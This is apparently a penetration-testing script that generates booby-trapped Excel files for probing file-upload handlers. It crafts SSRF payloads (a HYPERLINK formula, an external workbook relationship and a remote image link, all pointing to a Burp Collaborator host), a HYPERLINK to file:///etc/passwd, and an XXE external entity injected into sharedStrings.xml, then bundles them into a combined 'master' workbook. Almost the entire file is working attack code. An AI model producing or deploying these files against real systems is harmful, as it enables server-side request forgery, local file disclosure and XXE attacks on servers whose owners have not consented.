import zipfile
import shutil
from pathlib import Path
from openpyxl import Workbook
import xml.etree.ElementTree as ET

def generate_xlsx_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    ssrf_dir = output_dir / 'ssrf'
    ssrf_dir.mkdir(exist_ok=True)
    lfi_dir = output_dir / 'lfi'
    lfi_dir.mkdir(exist_ok=True)
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = f'=HYPERLINK("{base_url}/h1","click")'
    wb.save(ssrf_dir / "ssrf2_hyperlink.xlsx")
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = 'Test'
    xlsx_path = ssrf_dir / "ssrf1_workbook_rels.xlsx"
    wb.save(xlsx_path)
    
    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
        temp_dir = output_dir / "temp_ssrf1"
        zip_ref.extractall(temp_dir)
    
    workbook_rels_path = temp_dir / "xl" / "_rels" / "workbook.xml.rels"
    with open(workbook_rels_path, 'w', encoding='utf-8') as f:
        f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Target="{base_url}/x1" TargetMode="External"/>
</Relationships>''')
    
    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
        for file_path in temp_dir.rglob('*'):
            if file_path.is_file():
                arcname = file_path.relative_to(temp_dir)
                zip_ref.write(file_path, arcname)
    
    shutil.rmtree(temp_dir, ignore_errors=True)
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = 'Test'
    xlsx_path = ssrf_dir / "ssrf3_images_remote.xlsx"
    wb.save(xlsx_path)
    
    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
        temp_dir = output_dir / "temp_ssrf3"
        zip_ref.extractall(temp_dir)
    
    drawings_dir = temp_dir / "xl" / "drawings"
    drawings_dir.mkdir(parents=True, exist_ok=True)
    with open(drawings_dir / "drawing1.xml", 'w', encoding='utf-8') as f:
        f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<xdr:twoCellAnchor>
<xdr:from><xdr:col>0</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>0</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from>
<xdr:to><xdr:col>1</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>1</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to>
<xdr:pic>
<xdr:nvPicPr><xdr:cNvPr id="1" name="Picture 1"/><xdr:cNvPicPr/></xdr:nvPicPr>
<xdr:blipFill>
<a:blip r:link="rId10"/>
</xdr:blipFill>
</xdr:pic>
</xdr:twoCellAnchor>
</xdr:wsDr>''')
    
    drawings_rels_dir = drawings_dir / "_rels"
    drawings_rels_dir.mkdir(parents=True, exist_ok=True)
    with open(drawings_rels_dir / "drawing1.xml.rels", 'w', encoding='utf-8') as f:
        f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{base_url}/img-xlsx.png" TargetMode="External"/>
</Relationships>''')
    
    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
        for file_path in temp_dir.rglob('*'):
            if file_path.is_file():
                arcname = file_path.relative_to(temp_dir)
                zip_ref.write(file_path, arcname)
    
    shutil.rmtree(temp_dir, ignore_errors=True)
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = '=HYPERLINK("file:///etc/passwd","local")'
    wb.save(lfi_dir / "lfi4_hyperlink_file.xlsx")
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = 'Test'
    xlsx_path = xxe_dir / "xxe5_sharedstrings.xlsx"
    wb.save(xlsx_path)
    
    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
        temp_dir = output_dir / "temp_xxe5"
        zip_ref.extractall(temp_dir)
    
    sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
    with open(sharedstrings_path, 'w', encoding='utf-8') as f:
        f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [<!ENTITY % x SYSTEM "{base_url}/xxe-xlsx">%x;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
<si><t>test</t></si>
</sst>''')
    
    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
        for file_path in temp_dir.rglob('*'):
            if file_path.is_file():
                arcname = file_path.relative_to(temp_dir)
                zip_ref.write(file_path, arcname)
    
    shutil.rmtree(temp_dir, ignore_errors=True)
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = f'=HYPERLINK("{base_url}/h1","click")'
    master_path = output_dir / "master.xlsx"
    wb.save(master_path)
    
    with zipfile.ZipFile(master_path, 'r') as zip_ref:
        temp_dir = output_dir / "temp_master"
        zip_ref.extractall(temp_dir)
    
    workbook_rels_path = temp_dir / "xl" / "_rels" / "workbook.xml.rels"
    with open(workbook_rels_path, 'w', encoding='utf-8') as f:
        f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Target="{base_url}/x1" TargetMode="External"/>
<Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{base_url}/img-xlsx.png" TargetMode="External"/>
</Relationships>''')
    
    sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
    with open(sharedstrings_path, 'w', encoding='utf-8') as f:
        f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [<!ENTITY % x SYSTEM "{base_url}/xxe-xlsx">%x;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
<si><t>test</t></si>
</sst>''')
    
    drawings_dir = temp_dir / "xl" / "drawings"
    drawings_dir.mkdir(parents=True, exist_ok=True)
    with open(drawings_dir / "drawing1.xml", 'w', encoding='utf-8') as f:
        f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<xdr:twoCellAnchor>
<xdr:from><xdr:col>0</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>0</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from>
<xdr:to><xdr:col>1</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>1</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to>
<xdr:pic>
<xdr:nvPicPr><xdr:cNvPr id="1" name="Picture 1"/><xdr:cNvPicPr/></xdr:nvPicPr>
<xdr:blipFill>
<a:blip r:link="rId10"/>
</xdr:blipFill>
</xdr:pic>
</xdr:twoCellAnchor>
</xdr:wsDr>''')
    
    drawings_rels_dir = drawings_dir / "_rels"
    drawings_rels_dir.mkdir(parents=True, exist_ok=True)
    with open(drawings_rels_dir / "drawing1.xml.rels", 'w', encoding='utf-8') as f:
        f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{base_url}/img-xlsx.png" TargetMode="External"/>
</Relationships>''')
    
    with zipfile.ZipFile(master_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
        for file_path in temp_dir.rglob('*'):
            if file_path.is_file():
                arcname = file_path.relative_to(temp_dir)
                zip_ref.write(file_path, arcname)
    
    shutil.rmtree(temp_dir, ignore_errors=True)
